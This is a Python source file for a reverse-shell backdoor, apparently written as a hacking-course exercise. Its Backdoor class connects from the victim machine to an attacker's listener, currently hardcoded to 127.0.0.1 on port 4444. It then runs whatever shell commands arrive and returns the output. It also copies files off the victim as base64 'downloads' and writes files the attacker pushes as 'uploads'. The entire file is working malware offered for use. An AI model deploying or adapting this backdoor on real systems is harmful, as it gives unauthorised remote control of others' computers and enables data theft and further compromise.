# -*- coding: utf-8 -*-
# Author: Yiğit Şık 06/11/2021

# This script will establish the reverse shell connection between attacker and victim machine
# Commands taken from attacker will be executed through this script on victim computer,
# then the results will be sent back

# Built-in Modules
import os
import socket
import base64
import subprocess

# Third Party Modules
import json


class Backdoor:

    # Initialize the socket connection via constructor with the given ip and port value
    def __init__(self, ip, port):
        # TCP Connection
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    # Execute given command string in shell
    def execute_system_command(self, command):
        command_result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = command_result.stdout.read() + command_result.stderr.read()
        output_str = output_byte.decode()
        return output_str

    # Send Messages as Json format for data integrity purposes
    # Sending data plainly might cause problems because end of the data stream cannot be known
    def send_data(self, data):
        json_data = json.dumps(data).encode()
        self.connection.send(json_data)

    # Read data in 1024 byte chunks until json file is fully received
    def receive_data(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    # Change directory to given path. Equivalent of "cd" command
    def change_working_directory_to(self, path):
        try:
            os.chdir(path)
            return "[+] Changing working directory to " + path
        except OSError as e:
            return e.strerror

    # Read and write files in base64 format to transfer bytes reliably.
    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful"

    # Here we are waiting commands from attacker machine in an infinite loop
    def run(self):

        while True:

            command_result = ""

            # Wait (This is a blocking code) command string from attacker
            command = self.receive_data()

            # Close the connection
            if command[0] == "exit":
                self.connection.close()
                exit()

            # Change the directory. The default is where this script resides
            elif command[0] == "cd":
                try:
                    if len(command) > 1:
                        command_result = self.change_working_directory_to(command[1])
                    else:
                        command_result = self.execute_system_command(command[0])
                except Exception as e:
                    self.send_data(e)

            # Send files from victim to attacker
            elif command[0] == "download":
                try:
                    command_result = self.read_file(command[1]).decode()
                except FileNotFoundError:
                    self.send_data("Cannot find the file specified")

            # Write files that attacker sends
            elif command[0] == "upload":
                try:
                    command_result = self.write_file(command[1], command[2])
                except FileNotFoundError:
                    self.send_data("Cannot find the file specified")

            elif command == 'AreYouAwake?':
                self.send_data("Yes")

            # Execute other builtin commands
            else:
                command_result = self.execute_system_command(command)

            # Send results of commands executed to the attacker
            if len(command_result) > 0:
                self.send_data(command_result)


# Connect to the attacker's computer
my_backdoor = Backdoor("127.0.0.1", 4444)
my_backdoor.run()
